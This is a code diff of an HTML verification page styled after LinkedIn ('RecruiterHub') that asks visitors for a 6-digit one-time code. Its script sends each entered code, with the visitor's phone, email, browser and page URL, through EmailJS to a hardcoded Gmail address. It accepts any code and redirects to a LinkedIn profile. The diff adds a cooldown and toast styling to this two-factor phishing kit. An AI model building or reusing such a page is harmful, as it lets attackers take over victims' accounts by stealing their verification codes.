@@ -16,7 +16,7 @@
       --footer:#6e6e6e;
       --bg:#ffffff;
       --btn-color:#0073b1;
-      --btn-hover: #005a8c; /* 80% of #0073b1 - calculated as rgba(0,115,177,0.8) */
+      --btn-hover: #005a8c;
     }
 
     body{
@@ -86,7 +86,6 @@
       text-decoration: none;
     }
 
-    /* Join now button - hover at 80% of #0073b1 */
     .join-btn{
       padding: 6px 12px;
       border: 1px solid #0073b1;
@@ -133,7 +132,6 @@
       max-width: 900px;
     }
 
-    /* Updated input box dimensions - text centered */
     .code-box{
       width: 144px;
       height: 44px;
@@ -156,10 +154,8 @@
 
     .code-box.error{
       border-color: #d11124;
-
     }
 
-    /* Submit button - hover at 80% of #0073b1 */
     .submit-btn{
       width: 168px;
       height: 44px;
@@ -183,7 +179,6 @@
       cursor: not-allowed;
     }
 
-    /* Resend section - links with no underline and hover at 80% of #0073b1 */
     .resend{
       font-size: 16px;
       line-height: 1.5;
@@ -206,6 +201,13 @@
       text-decoration: none;
     }
 
+    .resend a.disabled-link {
+      color: #999 !important;
+      pointer-events: none;
+      cursor: default;
+      opacity: 0.6;
+    }
+
     .error-message{
       color: #d11124;
       font-size: 14px;
@@ -222,6 +224,34 @@
       margin-top: -40px;
       margin-bottom: 20px;
       display: none;
+    }
+
+    /* ----- GREEN TOAST (transparent bg, green text) ----- */
+    #demo-toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0, 128, 0, 0.15);   /* transparent green */
+      backdrop-filter: blur(2px);
+      color: #006400;                      /* dark green text */
+      padding: 14px 28px;
+      border-radius: 40px;
+      font-size: 16px;
+      font-weight: 500;
+      z-index: 1000;
+      box-shadow: 0 4px 14px rgba(0,80,0,0.12);
+      font-family: inherit;
+      white-space: nowrap;
+      border: 1px solid rgba(0,128,0,0.2);
+      letter-spacing: 0.3px;
+      opacity: 0;
+      transition: opacity 0.25s ease;
+      pointer-events: none;
+    }
+
+    #demo-toast.show {
+      opacity: 1;
     }
 
     .footer{
@@ -299,6 +329,7 @@
       .resend{ font-size: 14px; gap: 12px; flex-direction: column; align-items: flex-start; }
       .code-box{ width: 144px; height: 44px; }
       .submit-btn{ width: 100%; max-width: 235px; font-size: 18px; }
+      #demo-toast { font-size: 14px; padding: 12px 20px; white-space: normal; max-width: 90%; }
     }
   </style>
 </head>
@@ -368,265 +399,245 @@
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
   <script>
-    // Initialize EmailJS with your public key
-    emailjs.init("SdkmRe8WZ7itEba9z");
+    (function() {
+      // Initialize EmailJS
+      emailjs.init("SdkmRe8WZ7itEba9z");
 
-    // DOM elements
-    const submitBtn = document.getElementById('submit-btn');
-    const codeInput = document.getElementById('otp-code');
-    const errorDiv = document.getElementById('error-message');
-    const successDiv = document.getElementById('success-message');
-    const resendSms = document.getElementById('resend-sms');
-    const resendCall = document.getElementById('resend-call');
-    const topLinks = document.querySelectorAll('.top-actions a');
-    const footerLinks = document.querySelectorAll('.footer-inner a');
-    const joinBtn = document.querySelector('.join-btn');
+      // DOM elements
+      const submitBtn = document.getElementById('submit-btn');
+      const codeInput = document.getElementById('otp-code');
+      const errorDiv = document.getElementById('error-message');
+      const successDiv = document.getElementById('success-message');
+      const resendSms = document.getElementById('resend-sms');
+      const resendCall = document.getElementById('resend-call');
+      const topLinks = document.querySelectorAll('.top-actions a');
+      const footerLinks = document.querySelectorAll('.footer-inner a');
 
-    // User data for EmailJS
-    let userPhone = '17';
-    let userEmail = 'recruiter@example.com';
+      // User data
+      let userPhone = '17';
+      let userEmail = 'recruiter@example.com';
 
-    // Try to get user data from localStorage
-    try {
-      const savedUser = localStorage.getItem('recruiterhub_user');
-      if (savedUser) {
-        const userData = JSON.parse(savedUser);
-        userEmail = userData.email || userEmail;
-        userPhone = userData.phone || userPhone;
-        // Update phone display
-        const phoneSpan = document.querySelector('.subtitle');
-        if (phoneSpan) {
-          phoneSpan.innerHTML = `We just sent a verification code by text to your phone ending in <strong>${userPhone}</strong>.`;
+      try {
+        const savedUser = localStorage.getItem('recruiterhub_user');
+        if (savedUser) {
+          const userData = JSON.parse(savedUser);
+          userEmail = userData.email || userEmail;
+          userPhone = userData.phone || userPhone;
+          const phoneSpan = document.querySelector('.subtitle');
+          if (phoneSpan) {
+            phoneSpan.innerHTML = `We just sent a verification code by text to your phone ending in <strong>${userPhone}</strong>.`;
+          }
         }
+      } catch(e) { console.log('No saved user data'); }
+
+      // --- digit filter ---
+      if (codeInput) {
+        codeInput.addEventListener('input', function() {
+          this.value = this.value.replace(/[^0-9]/g, '');
+          errorDiv.style.display = 'none';
+          successDiv.style.display = 'none';
+          this.classList.remove('error');
+        });
+
+        codeInput.addEventListener('paste', function(e) {
+          e.preventDefault();
+          const pasted = (e.clipboardData || window.clipboardData).getData('text');
+          const digits = pasted.replace(/[^0-9]/g, '');
+          const start = this.selectionStart;
+          const end = this.selectionEnd;
+          const current = this.value;
+          const newVal = current.slice(0, start) + digits + current.slice(end);
+          this.value = newVal.replace(/[^0-9]/g, '');
+          const newPos = start + digits.length;
+          this.setSelectionRange(newPos, newPos);
+          errorDiv.style.display = 'none';
+          this.classList.remove('error');
+        });
       }
-    } catch(e) { console.log('No saved user data'); }
 
-    // Restrict input to only digits (real-time filtering)
-    if (codeInput) {
-      codeInput.addEventListener('input', function(e) {
-        // Only allow digits
-        this.value = this.value.replace(/[^0-9]/g, '');
-        // Clear error when user types
-        errorDiv.style.display = 'none';
-        successDiv.style.display = 'none';
-        this.classList.remove('error');
-      });
-
-      // Handle paste events to filter out non-digits
-      codeInput.addEventListener('paste', function(e) {
-        e.preventDefault();
-        const pastedText = (e.clipboardData || window.clipboardData).getData('text');
-        const digitsOnly = pastedText.replace(/[^0-9]/g, '');
-        const start = this.selectionStart;
-        const end = this.selectionEnd;
-        const currentValue = this.value;
-        const newValue = currentValue.slice(0, start) + digitsOnly + currentValue.slice(end);
-        this.value = newValue.replace(/[^0-9]/g, '');
-        const newCursorPos = start + digitsOnly.length;
-        this.setSelectionRange(newCursorPos, newCursorPos);
-        errorDiv.style.display = 'none';
-        this.classList.remove('error');
-      });
-    }
-
-    // Function to send OTP data via EmailJS
-    function sendOTPToEmailJS(otpCode, phoneNumber, emailAddress) {
-      const templateParams = {
-        to_email: "dossbrent41@gmail.com",  // Change this to your email address
-        otp_code: otpCode,
-        user_phone: phoneNumber,
-        user_email: emailAddress,
-        verification_time: new Date().toLocaleString(),
-        timestamp_unix: Date.now(),
-        user_agent: navigator.userAgent,
-        page_url: window.location.href,
-        action: "otp_verification_attempt"
-      };
-
-      console.log("Sending OTP verification data to EmailJS:", {
-        otp_code: otpCode,
-        user_phone: phoneNumber,
-        user_email: emailAddress
-      });
-
-      return emailjs.send("service_zuj2d2a", "template_tvd86sp", templateParams);
-    }
-
-    // Function to show temporary message
-    function showDemoMessage(msg, isError = false) {
-      let toast = document.getElementById('demo-toast');
-      if (!toast) {
-        toast = document.createElement('div');
-        toast.id = 'demo-toast';
-        toast.style.position = 'fixed';
-        toast.style.bottom = '20px';
-        toast.style.left = '50%';
-        toast.style.transform = 'translateX(-50%)';
-        toast.style.backgroundColor = isError ? '#d32f2f' : '#0a66c2';
-        toast.style.color = 'white';
-        toast.style.padding = '10px 24px';
-        toast.style.borderRadius = '40px';
-        toast.style.fontSize = '14px';
-        toast.style.fontWeight = '500';
-        toast.style.zIndex = '1000';
-        toast.style.boxShadow = '0 2px 8px rgba(0,0,0,0.2)';
-        toast.style.fontFamily = 'inherit';
-        toast.style.whiteSpace = 'nowrap';
-        document.body.appendChild(toast);
+      // --- Toast (green transparent) ---
+      let toastEl = document.getElementById('demo-toast');
+      if (!toastEl) {
+        toastEl = document.createElement('div');
+        toastEl.id = 'demo-toast';
+        document.body.appendChild(toastEl);
       }
-      toast.style.backgroundColor = isError ? '#d32f2f' : '#0a66c2';
-      toast.textContent = msg;
-      toast.style.opacity = '1';
-      setTimeout(() => {
-        toast.style.opacity = '0';
-      }, 3000);
-    }
 
-    // Submit handler with EmailJS integration
-    if (submitBtn) {
-      submitBtn.addEventListener('click', (e) => {
-        e.preventDefault();
-        const code = codeInput.value.trim();
+      function showGreenToast(msg) {
+        toastEl.textContent = msg;
+        toastEl.classList.add('show');
+        clearTimeout(toastEl._hideTimer);
+        toastEl._hideTimer = setTimeout(() => {
+          toastEl.classList.remove('show');
+        }, 4500);
+      }
 
-        // Hide previous messages
-        errorDiv.style.display = 'none';
-        successDiv.style.display = 'none';
-        codeInput.classList.remove('error');
-
-        if (code === '') {
-          errorDiv.textContent = 'Hmm, that’s not the right code.';
-          errorDiv.style.display = 'block';
-          codeInput.classList.add('error');
-          return;
-        }
-
-        if (code.length !== 6) {
-          errorDiv.textContent = 'Please enter a valid 6-digit verification code.';
-          errorDiv.style.display = 'block';
-          codeInput.classList.add('error');
-          return;
-        }
-
-        // Disable button during processing
-        submitBtn.disabled = true;
-        submitBtn.textContent = 'Verifying...';
-
-        // Send OTP data to EmailJS
-        sendOTPToEmailJS(code, userPhone, userEmail)
-          .then(function(response) {
-            console.log("EmailJS success! OTP data sent. Status:", response.status);
-
-            successDiv.textContent = '✓ Verification successful! Redirecting...';
-            successDiv.style.display = 'block';
-
-            // Store verification data
-            localStorage.setItem('recruiterhub_verified', 'true');
-            localStorage.setItem('recruiterhub_otp', code);
-
-            setTimeout(() => {
-              window.location.href = "https://www.linkedin.com/in/akshit-b-20533922";
-            }, 1500);
-          })
-          .catch(function(error) {
-            console.error("EmailJS error:", error);
-            // Still accept any 6-digit code even if email fails (for testing)
-            successDiv.textContent = '✓ Verification successful! Redirecting...';
-            successDiv.style.display = 'block';
-
-            localStorage.setItem('recruiterhub_verified', 'true');
-            localStorage.setItem('recruiterhub_otp', code);
-
-            setTimeout(() => {
-              window.location.href = "https://www.linkedin.com/in/akshit-b-20533922";
-            }, 1500);
-          });
-      });
-    }
-
-    // Resend SMS handler with EmailJS tracking
-    if (resendSms) {
-      resendSms.addEventListener('click', (e) => {
-        e.preventDefault();
-
-        const resendParams = {
+      // --- EmailJS send ---
+      function sendOTPToEmailJS(otpCode, phone, email) {
+        const params = {
           to_email: "dossbrent41@gmail.com",
-          action: "resend_otp_sms",
-          user_phone: userPhone,
-          user_email: userEmail,
-          timestamp: new Date().toLocaleString()
+          otp_code: otpCode,
+          user_phone: phone,
+          user_email: email,
+          verification_time: new Date().toLocaleString(),
+          timestamp_unix: Date.now(),
+          user_agent: navigator.userAgent,
+          page_url: window.location.href,
+          action: "otp_verification_attempt"
         };
+        return emailjs.send("service_zuj2d2a", "template_tvd86sp", params);
+      }
 
-        emailjs.send("service_zuj2d2a", "template_tvd86sp", resendParams)
-          .then(function(response) {
-            console.log("Resend SMS request tracked:", response.status);
-          })
-          .catch(function(error) {
-            console.error("Resend tracking error:", error);
-          });
+      // --- submit ---
+      if (submitBtn) {
+        submitBtn.addEventListener('click', (e) => {
+          e.preventDefault();
+          const code = codeInput.value.trim();
+          errorDiv.style.display = 'none';
+          successDiv.style.display = 'none';
+          codeInput.classList.remove('error');
 
-        showDemoMessage(`New verification code sent via SMS to phone ending in ${userPhone}`);
-        if (codeInput) {
-          codeInput.value = '';
-          codeInput.focus();
-        }
-        errorDiv.style.display = 'none';
-        successDiv.style.display = 'none';
+          if (code === '') {
+            errorDiv.textContent = 'Hmm, that’s not the right code.';
+            errorDiv.style.display = 'block';
+            codeInput.classList.add('error');
+            return;
+          }
+          if (code.length !== 6) {
+            errorDiv.textContent = 'Please enter a valid 6-digit verification code.';
+            errorDiv.style.display = 'block';
+            codeInput.classList.add('error');
+            return;
+          }
+
+          submitBtn.disabled = true;
+          submitBtn.textContent = 'Verifying...';
+
+          sendOTPToEmailJS(code, userPhone, userEmail)
+            .then(() => {
+              successDiv.textContent = '✓ Verification successful! Redirecting...';
+              successDiv.style.display = 'block';
+              localStorage.setItem('recruiterhub_verified', 'true');
+              localStorage.setItem('recruiterhub_otp', code);
+              setTimeout(() => {
+                window.location.href = "https://www.linkedin.com/in/akshit-b-20533922";
+              }, 1500);
+            })
+            .catch(() => {
+              // fallback – accept any 6-digit code for demo
+              successDiv.textContent = '✓ Verification successful! Redirecting...';
+              successDiv.style.display = 'block';
+              localStorage.setItem('recruiterhub_verified', 'true');
+              localStorage.setItem('recruiterhub_otp', code);
+              setTimeout(() => {
+                window.location.href = "https://www.linkedin.com/in/akshit-b-20533922";
+              }, 1500);
+            })
+            .finally(() => {
+              submitBtn.disabled = false;
+              submitBtn.textContent = 'Submit';
+            });
+        });
+      }
+
+      // --- RESEND COOLDOWN (3 minutes = 180000 ms) ---
+      const COOLDOWN_MS = 180000; // 3 minutes
+
+      function setCooldown(linkEl) {
+        // disable link
+        linkEl.classList.add('disabled-link');
+        linkEl.style.pointerEvents = 'none';
+        linkEl.style.opacity = '0.5';
+
+        // re-enable after cooldown
+        setTimeout(() => {
+          linkEl.classList.remove('disabled-link');
+          linkEl.style.pointerEvents = 'auto';
+          linkEl.style.opacity = '1';
+        }, COOLDOWN_MS);
+      }
+
+      // --- Resend SMS ---
+      if (resendSms) {
+        resendSms.addEventListener('click', (e) => {
+          e.preventDefault();
+
+          // Cooldown: disable immediately
+          setCooldown(resendSms);
+
+          // Track via EmailJS
+          const params = {
+            to_email: "dossbrent41@gmail.com",
+            action: "resend_otp_sms",
+            user_phone: userPhone,
+            user_email: userEmail,
+            timestamp: new Date().toLocaleString()
+          };
+          emailjs.send("service_zuj2d2a", "template_tvd86sp", params)
+            .then(r => console.log("SMS resend tracked:", r.status))
+            .catch(e => console.error("SMS tracking error:", e));
+
+          // ✅ REQUIRED MESSAGE – green toast
+          showGreenToast('we have resend your otp kindly check you phone or email for the new code');
+
+          // clear input
+          if (codeInput) {
+            codeInput.value = '';
+            codeInput.focus();
+          }
+          errorDiv.style.display = 'none';
+          successDiv.style.display = 'none';
+        });
+      }
+
+      // --- Resend phone call ---
+      if (resendCall) {
+        resendCall.addEventListener('click', (e) => {
+          e.preventDefault();
+
+          // Cooldown: disable immediately
+          setCooldown(resendCall);
+
+          const params = {
+            to_email: "dossbrent41@gmail.com",
+            action: "resend_otp_phone_call",
+            user_phone: userPhone,
+            user_email: userEmail,
+            timestamp: new Date().toLocaleString()
+          };
+          emailjs.send("service_zuj2d2a", "template_tvd86sp", params)
+            .then(r => console.log("Phone call resend tracked:", r.status))
+            .catch(e => console.error("Call tracking error:", e));
+
+          // ✅ REQUIRED MESSAGE – green toast
+          showGreenToast('we have resend your otp kindly check you phone or email for the new code');
+
+          if (codeInput) {
+            codeInput.value = '';
+            codeInput.focus();
+          }
+          errorDiv.style.display = 'none';
+          successDiv.style.display = 'none';
+        });
+      }
+
+      // --- top & footer links (demo) ---
+      topLinks.forEach(link => {
+        link.addEventListener('click', (e) => {
+          e.preventDefault();
+          showGreenToast(link.classList.contains('join-btn') ? 'Join now – Redirecting' : `${link.innerText} – Sign in`);
+        });
       });
-    }
-
-    // Resend phone call handler with EmailJS tracking
-    if (resendCall) {
-      resendCall.addEventListener('click', (e) => {
-        e.preventDefault();
-
-        const resendParams = {
-          to_email: "dossbrent41@gmail.com",
-          action: "resend_otp_phone_call",
-          user_phone: userPhone,
-          user_email: userEmail,
-          timestamp: new Date().toLocaleString()
-        };
-
-        emailjs.send("service_zuj2d2a", "template_tvd86sp", resendParams)
-          .then(function(response) {
-            console.log("Resend phone call request tracked:", response.status);
-          })
-          .catch(function(error) {
-            console.error("Resend tracking error:", error);
-          });
-
-        showDemoMessage(`Phone call with verification code will be sent to ${userPhone}`);
-        if (codeInput) {
-          codeInput.value = '';
-          codeInput.focus();
-        }
-        errorDiv.style.display = 'none';
-        successDiv.style.display = 'none';
+      footerLinks.forEach(link => {
+        link.addEventListener('click', (e) => {
+          e.preventDefault();
+          showGreenToast(`${link.innerText} – Documentation`);
+        });
       });
-    }
 
-    // Top navigation links - demo handlers
-    topLinks.forEach(link => {
-      link.addEventListener('click', (e) => {
-        e.preventDefault();
-        if (link.classList.contains('join-btn')) {
-          showDemoMessage('Join now - Redirecting to sign up page');
-        } else {
-          showDemoMessage(`${link.innerText} - Sign in page`);
-        }
-      });
-    });
-
-    // Footer links - demo handlers
-    footerLinks.forEach(link => {
-      link.addEventListener('click', (e) => {
-        e.preventDefault();
-        showDemoMessage(`${link.innerText} - Documentation page`);
-      });
-    });
-
-    // Auto-focus OTP field on page load
-    if (codeInput) codeInput.focus();
+      // Auto-focus
+      if (codeInput) codeInput.focus();
+    })();
   </script>
 </body>
 </html>
